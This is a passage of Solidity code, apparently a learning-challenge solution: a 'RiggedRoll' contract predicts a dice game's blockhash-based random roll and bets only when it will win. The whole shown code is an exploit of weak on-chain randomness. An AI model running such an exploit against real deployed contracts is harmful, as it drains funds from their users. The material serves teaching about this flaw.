...
contract RiggedRoll is Ownable {
    ...
    function riggedRoll() public {
        require(address(this).balance >= .002 ether, "you don't have enought");
        uint256 prize = 0.002 ether;
        bytes32 prevHash = blockhash(block.number - 1);
        bytes32 hash = keccak256(
            abi.encodePacked(prevHash, address(diceGame), diceGame.nonce())
        );
        uint256 roll = uint256(hash) % 16;
        console.log("\t", "   Dice FAKE Roll:", roll);
        require(roll < 2, "THIS IS NOT A GOOF ROLL");

        console.log("\t", "   Dice FAKE WINNING Roll:", roll);

        diceGame.rollTheDice{value: prize}();
